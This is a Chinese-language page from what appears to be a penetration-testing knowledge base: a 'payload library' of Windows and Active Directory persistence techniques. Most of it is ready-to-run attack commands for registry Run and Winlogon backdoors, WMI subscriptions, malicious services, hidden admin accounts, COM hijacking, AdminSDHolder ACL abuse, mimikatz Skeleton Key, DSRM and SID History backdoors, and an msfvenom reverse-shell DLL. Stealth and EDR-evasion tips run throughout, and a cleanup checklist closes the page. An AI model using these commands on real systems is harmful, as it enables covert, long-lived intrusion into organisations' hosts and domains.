# 内网/后渗透 — 权限维持 payload 库

> 父文档:[00-index.md](00-index.md) · ⚠️ 渗透测试场景下大多受限,见 [../../compliance.md](../../compliance.md)
> 涵盖:决策树 / 服务 / 计划任务 / 注册表 / WMI 订阅 / COM劫持 / AdminSDHolder / DSRM / Skeleton Key / Golden Ticket / 清理表

---

## 持久化技术决策树

按隐蔽性和持久性选择技术：

```
已获得权限
│
├─ 高隐蔽性需求（长期驻留、反检测优先）
│   ├─ 域级别：
│   │   ├─ AdminSDHolder + SDProp（隐蔽性高，自动传播）
│   │   ├─ Shadow Credentials（不修改密码，2016+）
│   │   └─ SID History 后门（低日志，需域管）
│   ├─ 主机级别：
│   │   ├─ COM 劫持（无新进程，隐蔽性最高）
│   │   ├─ WMI 事件订阅（无文件，难排查）
│   │   └─ 计划任务（PowerShell 远程管理，看起来"正常"）
│   └─ 工具：SharPersist / PowerLurk
│
├─ 快速短期（测试/应急，可接受被检测）
│   ├─ 添加本地管理员账户（最快）
│   ├─ 服务创建（sc create）
│   └─ 注册表 Run 键（最经典）
│
└─ 域控级别（终极持久化）
    ├─ Golden Ticket（krbtgt hash，任意TGT伪造）
    ├─ Diamond Ticket（真实TGT修改，更隐蔽）
    ├─ Skeleton Key（万能密码，需DC内存注入）
    └─ DSRM 后门（域控恢复模式，网络登录启用）
```

### 隐蔽性评估速查

| 技术 | 隐蔽性 | 持久性 | 日志量 | 重启存活 | EDR检测难度 |
|------|--------|--------|--------|---------|-----------|
| COM 劫持 | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | 极低 | ✅ | 极高 |
| WMI 事件订阅 | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | 低 | ✅ | 高 |
| AdminSDHolder | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | 极低 | ✅ | 极高 |
| Shadow Credentials | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | 低 | ✅ | 高 |
| 计划任务 | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ | 中 | ✅ | 中 |
| 注册表 Run | ⭐⭐ | ⭐⭐⭐⭐ | 高 | ✅ | 低 |
| 服务创建 | ⭐⭐ | ⭐⭐⭐⭐ | 高 | ✅ | 低 |
| Skeleton Key | ⭐⭐⭐ | ⭐⭐ | 中 | ❌ | 中 |
| Golden Ticket | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ | 中 | ✅ | 中 |
| SID History | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | 低 | ✅ | 高 |

---

### 注册表持久化  `persistence-registry`
通过注册表实现权限维持
子类：**注册表** · tags: `persistence` `registry` `windows` `autorun`

**前置条件：** 已获得目标机器权限；管理员权限；Windows系统

**攻击链：**

**1. Run键持久化**  _[windows]_
_添加Run键实现开机自启_
```
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Users\Public\backdoor.exe" /f
```

**2. RunOnce键**  _[windows]_
_RunOnce键，执行一次后删除_
```
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "C:\backdoor.exe" /f
```

**3. Winlogon Helper**  _[windows]_
_修改Userinit实现持久化_
```
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\backdoor.exe" /f
```

**4. 服务持久化**  _[windows]_
_创建服务实现持久化_
```
sc create Backdoor binPath= "C:\backdoor.exe" start= auto
```

**EDR 绕过变体：**

**1. 隐藏注册表键**
_使用空字节隐藏注册表键_
```
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\x00" /v Backdoor /t REG_SZ /d "C:\backdoor.exe" /f
```

**分析：** 注册表持久化会在系统启动或用户登录时执行恶意程序。

**OPSEC：** Run键是最常见的持久化方式，容易被检测；考虑使用更隐蔽的方式；定期检查注册表异常项

---

### WMI持久化  `persistence-wmi`
通过WMI事件订阅实现持久化
子类：**WMI** · tags: `wmi` `persistence` `windows`

**前置条件：** 管理员权限

**攻击链：**

**1. 创建事件过滤器**  _[windows]_
_创建WMI事件过滤器_
```
$filter = New-WmiEventFilter -Name "evil" -Query "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
```

**2. 创建事件消费者**  _[windows]_
_创建命令行消费者_
```
$consumer = New-WmiEventConsumer -Name "evil" -CommandLineTemplate "powershell -e BASE64_CMD"
```

**3. 绑定过滤器和消费者**  _[windows]_
_绑定触发执行_
```
New-WmiFilterToConsumerBinding -Filter $filter -Consumer $consumer
```

---

### 启动文件夹持久化  `persistence-startup`
通过启动文件夹实现持久化
子类：**启动文件夹** · tags: `startup` `persistence` `windows`

**前置条件：** 写入权限

**攻击链：**

**1. 当前用户启动文件夹**  _[windows]_
_当前用户启动_
```
copy evil.lnk "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
```

**2. 所有用户启动文件夹**  _[windows]_
_所有用户启动_
```
copy evil.lnk "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
```

---

### 服务持久化  `persistence-service`
通过创建服务实现持久化
子类：**服务** · tags: `service` `persistence` `windows`

**前置条件：** 管理员权限

**攻击链：**

**1. 创建服务**  _[windows]_
_创建自启动服务_
```
sc create evilsvc binPath= "cmd /c powershell -e BASE64_CMD" start= auto
```

**2. 启动服务**  _[windows]_
_启动服务_
```
sc start evilsvc
```

---

### DLL注入持久化  `persistence-dll-injection`
通过DLL注入实现持久化
子类：**DLL注入** · tags: `dll` `injection` `persistence`

**前置条件：** 代码执行权限；目标进程

**攻击链：**

**1. 创建恶意DLL**  _[linux]_
_生成恶意DLL_
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f dll > evil.dll
```

**2. 注入DLL**  _[windows]_
_将DLL注入到运行进程_
```
使用工具如InjectDLL、PowerShell等注入到目标进程
```

**3. AppInit_DLLs**  _[windows]_
_通过AppInit_DLLs注入_
```
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\evil.dll" /f
```

---

### COM劫持持久化  `persistence-com-hijack`
利用COM对象劫持实现高隐蔽性持久化
子类：**COM劫持** · tags: `com-hijack` `persistence` `windows` `high-stealth`

**前置条件：** 管理员权限；Windows系统

**原理：** 劫持正常应用程序加载的COM对象注册键 → 替换为恶意DLL路径 → 应用程序启动时自动加载恶意代码。优势：无新进程创建，利用合法应用触发。

**攻击链：**

**1. 查找可劫持COM对象**  _[windows]_

```
# 使用 PowerLurk 或 Process Monitor 找缺失CLSID
# 常见劫持目标：explorer.exe / iexplore.exe 加载的COM对象

# PowerLurk 枚举可劫持COM：
Import-Module .\PowerLurk.ps1
Get-VulnerableCOM

# 手动查找：HKCR\CLSID\{GUID}\InprocServer32 指向缺失DLL
# 或查找 HKCR\CLSID\{GUID}\LocalServer32 指向可写路径
```

**2. 注册恶意COM组件**  _[windows]_

```
# 方式A：InprocServer32 劫持（DLL）
reg add "HKCU\Software\Classes\CLSID\{TARGET_GUID}\InprocServer32" /ve /t REG_SZ /d "C:\Users\Public\evil.dll" /f
reg add "HKCU\Software\Classes\CLSID\{TARGET_GUID}\InprocServer32" /v ThreadingModel /t REG_SZ /d "Apartment" /f

# 方式B：LocalServer32 劫持（EXE）
reg add "HKLM\Software\Classes\CLSID\{TARGET_GUID}\LocalServer32" /ve /t REG_SZ /d "C:\Users\Public\backdoor.exe" /f
```

**3. 常见劫持目标 CLSID**

```
# Explorer 组件（触发频繁，高隐蔽）：
# {BDEADF00-C265-11D0-BCED-00A0C90AB50F}  →  Web 文件夹 COM
# {24F14F02-7B1C-11d1-838F-0000F80461CF} → Explorer Browser

# 劫持后通过正常桌面操作触发，无需额外动作
```

**4. PowerLurk 自动化**  _[windows]_

```
# 一键 COM 劫持
Import-Module .\PowerLurk.ps1
Register-MaliciousScript -ScriptPath C:\Users\Public\payload.ps1 -Event "WMIPRVSE" -PersistenceMethod WMI
Register-MaliciousScript -ScriptPath C:\Users\Public\payload.ps1 -PersistenceMethod COM -COMCLSID "{TARGET_GUID}"
```

**OPSEC：** COM劫持不创进程/不用计划任务/不改启动项——常规EDR规则盲区。选择合适的CLSID可在系统空闲时触发，进一步降低检测率。

---

### AdminSDHolder + SDProp 域持久化  `adminsdholder-persistence`
利用 AdminSDHolder 对象权限自动传播实现域级持久化
子类：**域持久化** · tags: `adminsdholder` `sdprop` `domain` `high-stealth`

**前置条件：** 域管理员权限

**原理：** SDProp 进程每 60 分钟（默认）将 AdminSDHolder 对象的 ACL 复制到所有受保护组（Domain Admins / Enterprise Admins / Schema Admins / Administrators / Account Operators 等），修改 AdminSDHolder ACL → 60 分钟内自动传播到所有受保护组。

**核心受保护组列表：**
```
Administrators
Domain Admins
Enterprise Admins
Schema Admins
Account Operators
Backup Operators
Print Operators
Server Operators
Domain Controllers
Replicator
Cert Publishers
Read-Only Domain Controllers
```

**攻击链：**

**1. 修改 AdminSDHolder ACL**  _[windows]_

```
# 添加后门用户 Full Control 到 AdminSDHolder
Import-Module ActiveDirectory
$acl = Get-Acl -Path "AD:CN=AdminSDHolder,CN=System,DC=domain,DC=com"
$identity = [System.Security.Principal.NTAccount] "domain\backdoor"
$accessRule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identity, "GenericAll", "Allow")
$acl.AddAccessRule($accessRule)
Set-Acl -Path "AD:CN=AdminSDHolder,CN=System,DC=domain,DC=com" -AclObject $acl

# 或使用 dacledit.py (Linux):
python3 dacledit.py -action 'write' -principal 'backdoor' -target 'CN=AdminSDHolder,CN=System,DC=domain,DC=com' -rights FullControl domain.com/admin:password -dc-ip DC_IP
```

**2. 强制立即 SDProp 传播**  _[windows]_

```
# 手动触发 SDProp（正常60分钟自动执行）
# 使用 runProtectGroupsWithAdminSDHolder.exe 或
# 重启 DC 后自动触发

# PowerShell 强制触发：
Invoke-SDPropagator  # 需要特定权限
```

**3. 验证传播**  _[windows]_

```
# 60分钟后检查 Domain Admins 组 ACL
$da = Get-ADGroup -Identity "Domain Admins"
(Get-Acl "AD:$($da.DistinguishedName)").Access | Where-Object {$_.IdentityReference -like "*backdoor*"}
# 应显示 backdoor 用户有 FullControl
```

**防御规避提示：**
- AdminSDHolder ACL 修改记录为事件 5136（目录服务更改），但混杂在大量正常事件中
- 默认 60 分钟传播延迟期窗口，检测需要主动审计 AdminSDHolder ACL
- 清理需同时从 AdminSDHolder 和所有受保护组删除 ACL → 复杂度极高

---

### 后门用户  `persistence-backdoor-user`
创建后门用户账户
子类：**用户** · tags: `user` `backdoor` `persistence`

**前置条件：** 管理员权限

**攻击链：**

**1. 创建用户**  _[windows]_
_创建管理员用户_
```
net user backdoor P@ssw0rd /add
net localgroup administrators backdoor /add
```

**2. 隐藏用户**  _[windows]_
_创建隐藏用户（$结尾）_
```
net user backdoor$ P@ssw0rd /add
```

**3. 修改注册表隐藏**  _[windows]_
_通过注册表隐藏用户_
```
reg add "HKLM\SAM\SAM\Domains\Account\Users\Names\backdoor$" /f
```

---

### 隐藏用户  `persistence-hidden-user`
创建隐藏的管理员用户
子类：**隐藏用户** · tags: `hidden` `user` `persistence`

**前置条件：** SYSTEM权限

**攻击链：**

**1. 创建用户**  _[windows]_
_创建$结尾用户_
```
net user hidden$ P@ssw0rd /add
```

**2. 添加到管理员组**  _[windows]_
_添加管理员权限_
```
net localgroup administrators hidden$ /add
```

**3. 注册表隐藏**  _[windows]_
_通过注册表完全隐藏_
```
reg export "HKLM\SAM\SAM\Domains\Account\Users\000003E9" user.reg
修改F值
reg import user.reg
```

---

### 计划任务持久化  `persistence-scheduled`
通过计划任务实现持久化
子类：**计划任务** · tags: `persistence` `scheduled` `task`

**前置条件：** 创建任务权限

**攻击链：**

**1. 创建登录任务**  _[windows]_
_创建登录时运行的任务_
```
schtasks /create /tn "Backdoor" /tr "C:\backdoor.exe" /sc onlogon /ru SYSTEM
```

**2. 创建定时任务**  _[windows]_
_创建每5分钟运行的任务_
```
schtasks /create /tn "Backdoor" /tr "C:\backdoor.exe" /sc minute /mo 5
```

**3. PowerShell创建**  _[windows]_
_使用PowerShell创建任务_
```
$action = New-ScheduledTaskAction -Execute "C:\backdoor.exe"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Backdoor" -User "System"
```

**4. Linux Cron**  _[linux]_
_Linux计划任务_
```
crontab -e
添加: * * * * * /tmp/backdoor.sh
或: @reboot /tmp/backdoor.sh
```

---

### Skeleton Key后门  `skeleton-key`
在域控制器植入万能密码
子类：**域后门** · tags: `skeleton-key` `backdoor` `domain`

**前置条件：** 域管理员权限；访问域控制器

**攻击链：**

**1. 植入Skeleton Key**  _[windows]_
_使用Mimikatz植入_
```
mimikatz # privilege::debug
mimikatz # misc::skeleton
```

**2. 使用万能密码**  _[windows]_
_使用万能密码登录_
```
万能密码: mimikatz
任何域用户都可以使用mimikatz作为密码登录
```

**3. 检测方法**  _[windows]_
_检测Skeleton Key_
```
检查LSASS内存:
Get-Process lsass
使用EDR检测内存注入
```

---

### DSRM后门  `dsrm-backdoor`
利用DSRM账户建立后门
子类：**域后门** · tags: `dsrm` `backdoor` `domain`

**前置条件：** 域管理员权限；访问域控制器

**攻击链：**

**1. 获取DSRM密码**  _[windows]_
_获取DSRM账户哈希_
```
mimikatz # lsadump::lsa /patch /name:krbtgt
或
mimikatz # token::elevate
mimikatz # lsadump::sam
```

**2. 同步DSRM密码**  _[windows]_
_同步DSRM密码与域管理员_
```
ntdsutil
set dsrm password
sync from domain account admin
q
q
```

**3. 启用DSRM账户**  _[windows]_
_允许DSRM账户远程登录_
```
修改注册表:
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```

**4. 使用DSRM登录**  _[windows]_
_使用DSRM账户_
```
使用DSRM账户哈希:
mimikatz # sekurlsa::pth /domain:DC_NAME /user:Administrator /ntlm:HASH
或使用Pass-the-Hash
```

---

### SID History后门  `sid-history`
利用SID History建立后门
子类：**域后门** · tags: `sid-history` `backdoor` `domain`

**前置条件：** 域管理员权限

**攻击链：**

**1. 添加SID History**  _[windows]_
_添加SID History_
```
mimikatz # sid::add /sam:backdoor_user /new:administrator
将域管SID添加到普通用户
```

**2. 验证SID History**  _[windows]_
_检查SID History_
```
Get-ADUser backdoor_user -Properties sidHistory
或
whoami /all
```

**3. 使用后门**  _[windows]_
_使用后门账户_
```
使用backdoor_user登录
自动获得域管理员权限
```

---

### 进程镂空持久化  `persistence-process-hollowing`
利用进程镂空技术实现持久化
子类：**进程注入** · tags: `process-hollowing` `persistence` `injection`

**前置条件：** 代码执行权限

**攻击链：**

**1. 进程镂空原理**  _[windows]_
_进程镂空原理_
```
1. 创建合法进程(挂起状态)
2. 替换进程内存
3. 恢复执行
```

**2. C#实现**  _[windows]_
_C#进程镂空_
```
using System.Runtime.InteropServices;
// 创建挂起进程
CreateProcess("C:\\Windows\\System32\\svchost.exe", ..., CREATE_SUSPENDED, ...);
// 替换内存
NtUnmapViewOfSection(...);
VirtualAllocEx(...);
WriteProcessMemory(...);
ResumeThread(...);
```

**3. 检测方法**  _[windows]_
_检测进程镂空_
```
检查进程内存:
- 进程路径与内存内容不匹配
- 异常的内存区域
- 使用EDR检测
```

---



---

### 自动化持久化工具  `persistence-tools`
SharPersist / PowerLurk 速查
子类：**工具** · tags: `persistence` `tools` `sharpersist` `powerlurk`

**SharPersist（C#，Windows，高成功率）**

```
# 所有技术列表
SharPersist.exe --help

# 常用持久化方式：
# 1. 计划任务（user logon触发）
SharPersist.exe -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "UpdateTask" -m add

# 2. 注册表HKCU Run
SharPersist.exe -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -n "SoftwareUpdate" -m add

# 3. 启动文件夹
SharPersist.exe -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "update.lnk" -m add

# 4. WMI事件订阅
SharPersist.exe -t wmi -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "EvilWMI" -m add

# 5. KeePass 配置文件劫持
SharPersist.exe -t keepass -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "EvilKeePass" -m add

# 检查现有持久化
SharPersist.exe -t schtaskbackdoor -m list
SharPersist.exe -t reg -m list
```

**PowerLurk（PowerShell，隐蔽COM/WMI劫持）**

```
# 查找可劫持 COM 对象
Import-Module .\PowerLurk.ps1
Get-VulnerableCOM

# 注册恶意 WMI 消费者（无文件落地）
Register-MaliciousWmiConsumer -ConsumerName "EvilConsumer" -Script "Start-Process -NoNewWindow calc.exe"

# 注册恶意脚本（事件触发）
Register-MaliciousScript -ScriptPath "C:\payload.ps1" -Event "SystemStartup" -PersistenceMethod WMI

# 列出已注册的恶意持久化
Get-MaliciousWmiEvent
```

---

### 持久化清理检查表  `persistence-cleanup`

> ⚠️ 渗透测试结束后必须清理所有持久化。每项确认后打 ✓

| 检查项 | 清理命令 | 确认 |
|--------|---------|------|
| **计划任务** | `schtasks /delete /tn "TaskName" /f` | ☐ |
| **服务** | `sc delete ServiceName` | ☐ |
| **注册表Run** | `reg delete "HKLM\...\Run" /v ValueName /f` | ☐ |
| **WMI事件** | `Get-WmiObject __EventFilter \| Remove-WmiObject` | ☐ |
| **COM劫持** | `reg delete "HKCR\CLSID\{GUID}\InprocServer32" /f` | ☐ |
| **启动文件夹** | `del /f "%APPDATA%\...\Startup\evil.lnk"` | ☐ |
| **后门用户** | `net user backdoor /delete` | ☐ |
| **SID History** | `Remove-ADObject -Identity <user> -Properties sidHistory` 或 DCShadow撤销 | ☐ |
| **AdminSDHolder** | 从 AdminSDHolder **和**所有受保护组删除 ACL 条目 | ☐ |
| **Shadow Credentials** | `pywhisker.py --action remove` | ☐ |
| **DSRM密码** | `ntdsutil → set dsrm password → reset password` 恢复原密码 | ☐ |
| **Skeleton Key** | **重启 DC**（唯一完整清除方式，内存注入型） | ☐ |
| **Golden Ticket** | 重置 krbtgt 密码 **两次**（`Reset-ADAccountPassword krbtgt` 执行两次） | ☐ |
| **Winlogon Hook** | `reg delete "HKLM\...\Winlogon" /v Userinit /f` → 恢复默认 | ☐ |
| **DLL劫持** | 删除恶意DLL并恢复注册表原有值 | ☐ |

**Golden Ticket 清理要点：**
```
# 重置 krbtgt 密码需执行两次（KRBTGT 密码历史 = 2）：
Reset-ADAccountPassword -Identity krbtgt -NewPassword (ConvertTo-SecureString "NewP@ssw0rd..." -AsPlainText -Force)
# 等待域复制完成后再次执行
Reset-ADAccountPassword -Identity krbtgt -NewPassword (ConvertTo-SecureString "NewP@ssw0rd2..." -AsPlainText -Force)
# 两次后所有旧 TGT 失效
```

---

← 回 [00-index.md](00-index.md) · 上一篇:[`16-recon.md`](16-recon.md) · 下一篇:[`18-exchange.md`](18-exchange.md)
